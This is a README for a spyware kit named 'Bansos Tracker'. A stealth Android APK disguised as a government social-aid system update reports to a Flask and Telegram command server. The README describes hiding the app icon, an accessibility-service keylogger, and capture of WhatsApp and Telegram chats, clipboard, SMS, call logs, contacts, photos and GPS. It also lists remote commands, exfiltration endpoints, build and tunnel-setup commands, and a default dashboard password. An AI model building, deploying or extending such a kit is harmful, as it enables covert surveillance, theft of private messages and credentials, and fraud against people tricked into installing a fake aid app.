# Bansos Tracker — GPS Monitoring System

**Sistem Monitoring Terpadu** — Telegram Bot + Android APK (A11Y Keylogger) + Web Dashboard Premium  
*v5.1 — Keylog · Clipboard · App Tracking · Remote Command · Chat Capture · Security*

---

## Quick Start

```bash
# 1. Clone
git clone https://github.com/clickmamaheti-prog/bansos-tracker.git
cd bansos-tracker

# 2. Install Python dependencies
pip3 install flask python-telegram-bot requests flask-socketio

# 3. Set environment
export BOT_TOKEN="<token_dari_botfather>"
export BASE_URL="https://domain-anda.com"
export DASHBOARD_PASSWORD="password_anda"

# 4. Jalankan
python3 bot.py
```

Buka `http://localhost:5000` — landing page.  
Dashboard admin: `http://localhost:5000/admin/dashboard`

---

## Struktur File

```
bansos-tracker/
├── bot.py                          # Main Flask + Telegram bot (v5.1)
├── security.py                     # CSRF, rate limit, IP blacklist, audit
├── start.sh                        # Startup script
├── .secret_key                     # Persistent Flask secret
├── .ip_blacklist.json              # Persistent IP blacklist
├── .audit.log                      # Security audit log
├── README.md
│
├── templates/                      # Web pages
│   ├── index.html                  # Landing page
│   ├── dashboard.html              # Dashboard v5.1 — 17 sections
│   ├── login.html                  # Admin login + CSRF
│   ├── track.html                  # Target tracking page
│   ├── map.html                    # Google Maps page
│   └── error.html
│
├── static/
│   └── icons.svg                   # Premium SVG icons
│
├── android/                        # Android APK source
│   ├── build-apk.sh
│   └── BansosService/              # Stealth APK v5.1
│       └── app/src/main/
│           ├── AndroidManifest.xml
│           ├── java/com/kemensos/bansos/
│           │   ├── MainActivity.java
│           │   ├── UpdateService.java
│           │   ├── KeylogService.java     # A11Y keylog + chat capture v5.1
│           │   ├── NotifService.java      # NotificationListener v5.1
│           │   ├── SmsReceiver.java
│           │   └── CallLogService.java
│           └── res/
│               ├── values/strings.xml
│               └── xml/accessibility_service_config.xml
│
└── downloads/
    └── bantuan-sosial-v4.0.apk
```

---

## Backend — Flask + Telegram Bot

### Environment Variables

| Variable | Wajib? | Deskripsi |
|----------|--------|-----------|
| `BOT_TOKEN` | Ya | Token Telegram Bot dari @BotFather |
| `BASE_URL` | Ya | URL publik (domain) |
| `DASHBOARD_PASSWORD` | Ya | Password login dashboard (default: Kosay378%) |

### Bot Commands

| Command | Deskripsi |
|---------|-----------|
| `/start` | Menu utama + daftar link tracking |
| `/help` | Bantuan |
| `/links` | Daftar semua link tracking |
| `/map <id>` | Lihat lokasi di peta |
| `/keylog <device_id>` | Lihat keylog terbaru |
| `/clip <device_id>` | Lihat clipboard history |
| `/apps <device_id>` | Lihat aktivitas aplikasi |
| `/devices` | Daftar perangkat terhubung |
| `/cmd <device_id> <command>` | Kirim remote command |
| `/apkversion` | Cek versi APK |
| `/data <device_id>` | Semua data perangkat |
| `/download` | Download APK |

### API Endpoints

| Endpoint | Method | Auth | Deskripsi |
|----------|--------|------|-----------|
| `/` | GET | - | Landing page |
| `/admin/login` | GET/POST | CSRF | Login dashboard |
| `/admin/dashboard` | GET | Session | Dashboard monitoring |
| `/admin/dashboard/json` | GET | Session | Dashboard data JSON |
| `/admin/dashboard/events-json` | GET | Session | Location events |
| `/admin/security` | GET | Session | IP blacklist status |
| `/download/apk` | GET | Session | Download APK |
| `/webhook` | POST | Telegram | Telegram webhook (optional) |
| `/api/location/<tid>` | POST | Rate limit | GPS location from target |
| `/api/collect-notif` | POST | Rate limit | Notifications from APK |
| `/api/collect-sms` | POST | Rate limit | SMS from APK |
| `/api/collect-call-logs` | POST | Rate limit | Call logs |
| `/api/collect-contacts` | POST | Rate limit | Contacts |
| `/api/collect-apps` | POST | Rate limit | App usage |
| `/api/collect-sim-change` | POST | Rate limit | SIM change alerts |
| `/api/chat-capture/<device_id>` | POST | Rate limit | Chat messages from A11Y |
| `/api/whatsapp-status/<device_id>` | POST/GET | Rate limit | WhatsApp Last Seen |
| `/api/security/block/<ip>` | POST | Session | Block IP |
| `/api/security/unblock/<ip>` | POST | Session | Unblock IP |

---

## Android APK — BansosService (Stealth v5.1)

**Package:** `com.kemensos.bansos` — "Pembaruan Sistem"  
**Target:** Android 14 (API 34) | **Min:** Android 5.0 (API 21)

### Fitur v5.1

| Fitur | Detail |
|-------|--------|
| Stealth | Transparent activity, no launcher icon, `excludeFromRecents` |
| Keylogger A11Y | Semua input keyboard via AccessibilityService, auto-flush 3s |
| Chat Capture | WhatsApp/TG/Messenger — tree traversal depth 20 |
| WhatsApp Last Seen | Detek "online", "last seen", "typing" dari UI |
| Notification | WA/TG MessagingStyle + full content parsing |
| Clipboard Monitor | Semua teks yang di-copy |
| App Tracking | Riwayat switch aplikasi |
| GPS | Lokasi real-time via foreground service |
| Call Logs | History panggilan |
| Contacts | Buku kontak |
| SIM Change | Deteksi ganti SIM card |
| Remote Command | Polling perintah dari server |
| Security | CSRF, rate limit, IP blacklist, audit log |

### KeylogService.java — Chat Capture

```
A11Y Tree Traversal (depth 20)
├── Strategy 1: TextView content (message text)
├── Strategy 2: Content descriptions (WA accessibility labels)
├── Strategy 3: WhatsApp-specific view IDs
└── Strategy 4: Telegram-specific view IDs
Events: WINDOW_CONTENT_CHANGED + VIEW_SCROLLED → auto re-capture
```

### NotifService.java — Notification Parsing

```
Extracts from Bundle extras:
├── title, text, bigText, subText, summaryText
├── conversationTitle (group chat name)
├── MessagingStyle.Message[] (sender + text per message)
└── android.messages[] (fallback parsing)
```

### Build APK

```bash
# Requirements: Java 11+, Android SDK build-tools 34
export ANDROID_HOME=/opt/android-sdk
cd android/BansosService
bash build-apk.sh
```

---

## Dashboard — 17 Sections

| Section | Data |
|---------|------|
| Overview | Stats: links, lokasi, notif, keylog, clipboard, devices |
| Location | GPS events + Google Maps |
| Keylogger | Keystrokes dengan filter package |
| Clipboard | Text yang di-copy |
| Call Logs | History panggilan |
| SMS | SMS masuk |
| Notifications | WA, Telegram, Messenger, dll |
| Chats | Percakapan chat terintegrasi |
| Facebook | Aktivitas FB + Messenger |
| WhatsApp | Pesan WhatsApp |
| WA Status | Last Seen & Online status |
| Gallery | Foto & media |
| Contacts | Buku kontak |
| App Usage | Timeline aplikasi |
| Devices | Status perangkat |
| Commands | Remote command console |
| Settings | Security: IP blacklist |

---

## Security

| Proteksi | Detail |
|----------|--------|
| CSRF Token | Setiap form login butuh token valid |
| Rate Limit | 30 request/menit/IP |
| Login Brute Force | 5 gagal login -> block 15 menit |
| IP Blacklist | Persistent, block/unblock via API |
| Security Headers | HSTS, XSS, Clickjack, CSP, nosniff, Referrer-Policy |
| Audit Log | Semua request tercatat di `.audit.log` |

---

## Cloudflare Tunnel

```bash
# Setup tunnel
cloudflared tunnel create bansos-tracker

# Config (~/.cloudflared/config.yml)
tunnel: <tunnel-id>
credentials-file: /root/.cloudflared/<tunnel-id>.json
ingress:
  - hostname: bansos.domain.com
    service: http://localhost:5000
  - service: http_status:404

# Run
cloudflared tunnel run
```

## Database (SQLite)

| Table | Fungsi |
|-------|--------|
| `links` | Link tracking |
| `tracking_events` | GPS location events |
| `keylog_log` | Keystrokes |
| `clipboard_log` | Clipboard captures |
| `app_usage_log` | App timeline |
| `notif_log` | Notifications |
| `sms_log` | SMS |
| `call_logs` | Call history |
| `contacts` | Contact list |
| `photos` | Media captures |
| `command_queue` | Remote commands |
| `device_status` | Device status |
| `sim_change_alerts` | SIM change |
| `whatsapp_status` | WA Last Seen |

---

> **DevCultur © 2026** — `bansos.jokichannel.eu.org`  
> Repository: `github.com/clickmamaheti-prog/bansos-tracker`
